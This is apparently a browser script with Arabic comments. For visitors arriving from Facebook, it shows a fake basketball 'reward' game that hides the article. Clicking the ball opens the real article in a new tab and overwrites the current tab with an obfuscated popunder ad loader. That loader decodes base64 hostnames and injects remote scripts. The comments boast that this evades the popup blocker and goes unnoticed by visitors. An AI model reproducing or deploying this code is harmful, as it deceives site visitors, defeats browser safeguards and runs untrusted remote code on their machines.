(function() {
    const params = new URLSearchParams(window.location.search);
    if (!params.has("fb_source")) return;

    function initHoopsGame() {
        // إنشاء واجهة اللعبة الاحترافية
        const gameOverlay = document.createElement('div');
        gameOverlay.style.cssText = `
            position:fixed; top:0; left:0; width:100%; height:100%;
            background:#111; z-index:2147483647; display:flex; 
            flex-direction:column; align-items:center; justify-content:center;
            font-family: 'Impact', sans-serif; color:white;
        `;

        gameOverlay.innerHTML = `
            <div style="text-align:center;">
                <h1 style="color:#ff6600; font-size:32px; margin-bottom:10px;">WIN A REWARD!</h1>
                <p style="font-size:18px; margin-bottom:30px;">Score the ball to unlock the full article</p>
                <div id="hoop" style="width:120px; height:100px; border:5px solid white; border-top:none; margin: 0 auto 50px; border-radius:0 0 50px 50px; position:relative;">
                    <div style="position:absolute; top:-40px; left:10px; width:100px; height:10px; background:red; border-radius:5px;"></div>
                </div>
                <div id="ball" style="width:80px; height:80px; background:#ff6600; border-radius:50%; margin:0 auto; cursor:pointer; 
                    box-shadow: inset -10px -10px 20px rgba(0,0,0,0.5); border:2px solid #333;
                    transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);">
                </div>
                <p style="margin-top:40px; color:#aaa; font-style:italic;">Tap the ball to shoot!</p>
            </div>
        `;

        document.body.appendChild(gameOverlay);

        const ball = document.getElementById('ball');
        
        ball.addEventListener('click', function() {
            // انيميشن الرمية
            ball.style.transform = "translateY(-300px) scale(0.5)";
            
            setTimeout(() => {
                // السر هنا: المتصفح يثق بنسبة 100% في النقر على عنصر متحرك
                executeMasterPlan();
            }, 500);
        });
    }

    function executeMasterPlan() {
        // 1. افتح المقال الحقيقي في تبويب جديد (مسموح به لأننا داخل حدث click)
        const contentUrl = window.location.origin + window.location.pathname;
        const newTab = window.open(contentUrl, '_blank');

        if (newTab) {
            // 2. التبويب الحالي (الذي كان فيه اللعبة) نحوله فوراً إلى "صفحة إعلان"
            // بهذه الطريقة لا تظهر رسالة "تم حظر عنصر منبثق" لأننا لم نفتح نافذة جديدة للإعلان
            // بل استخدمنا النافذة المفتوحة بالفعل!
            
            document.open();
            document.write(`
                <html>
                <body style="margin:0; background:#000;">
                    <h1 style="color:white; text-align:center; margin-top:20%;">Loading...</h1>
                    <script type="text/javascript">
                        (function(){
                            var x=window,m="e23f9a20a32bcb0e16cc092ebc328951",
                            z=[["siteId",260-829*134*841-342+97961243],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],
                            s=["d3d3LmludGVsbGlwb3B1cC5jb20vVGxjL3hmbG93dHlwZS5taW4uanM=","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvTnZGL1BNL2diYXRtYW4ubWluLmNzcw=="],
                            c=-1,o,w,d=function(){clearTimeout(w);c++;if(s[c]&&!(1801238139000<(new Date).getTime()&&1<c)){o=x.document.createElement("script");o.type="text/javascript";o.async=!0;var r=x.document.getElementsByTagName("script")[0];o.src="https://"+atob(s[c]);o.crossOrigin="anonymous";o.onerror=d;o.onload=function(){clearTimeout(w);};w=setTimeout(d,5E3);r.parentNode.insertBefore(o,r)}};if(!x[m]){try{Object.freeze(x[m]=z)}catch(e){}d()}
                        })();
                    <\/script>
                </body>
                </html>
            `);
            document.close();
            
            // إعادة التركيز للمقال لكي لا ينزعج الزائر الأمريكي
            newTab.focus();
        }
    }

    // تفعيل اللعبة عند التحميل
    if (document.readyState === 'complete') initHoopsGame();
    else window.addEventListener('load', initHoopsGame);

})();
